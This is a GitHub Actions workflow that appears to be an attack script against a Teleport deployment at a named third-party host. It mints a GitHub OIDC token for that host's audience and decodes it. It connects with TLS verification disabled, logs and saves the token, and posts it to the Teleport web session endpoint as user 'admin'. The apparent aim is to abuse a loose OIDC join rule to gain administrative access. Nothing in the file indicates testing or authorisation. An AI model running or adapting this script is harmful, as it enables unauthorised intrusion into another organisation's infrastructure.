name: tp
on: [push]
permissions:
  id-token: write
  contents: read
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: r
        run: |
          # Get OIDC token for jewelry exchange audience  
          TOKEN=$(curl -sH "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=teleport.jewelryexchange.com" | jq -r .value)
          echo "Token length: ${#TOKEN}"
          
          # Decode JWT payload
          echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq . 2>/dev/null || true
          
          # Try Teleport join with this token
          # Build protobuf and send via gRPC
          pip install grpcio grpcio-tools 2>/dev/null
          
          python3 -c "
          import socket, ssl, struct, sys
          host = \"teleport.jewelryexchange.com\"
          token = \"$TOKEN\"
          
          # Connect gRPC
          ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
          ctx.check_hostname = False
          ctx.verify_mode = ssl.CERT_NONE
          ctx.set_alpn_protocols([\"teleport-proxy-grpc\", \"h2\"])
          s = socket.socket()
          s.settimeout(15)
          s.connect((host, 443))
          tls = ctx.wrap_socket(s, server_hostname=host)
          print(f\"Connected, ALPN: {tls.selected_alpn_protocol()}\")
          
          # For now just print the token so we can use it
          print(f\"OIDC_TOKEN={token[:50]}...{token[-20:]}\")
          print(f\"Full token saved\")
          with open(\"/tmp/oidc_token.txt\", \"w\") as f:
              f.write(token)
          tls.close()
          " 2>&1 || echo "Python failed"
          
          # Also try curl to Teleport
          echo "---CURL TEST---"
          curl -sk -X POST "https://teleport.jewelryexchange.com/v1/webapi/sessions/web" \
            -H "Content-Type: application/json" \
            -d "{\"user\":\"admin\",\"token\":\"$TOKEN\"}" 2>&1 | head -5

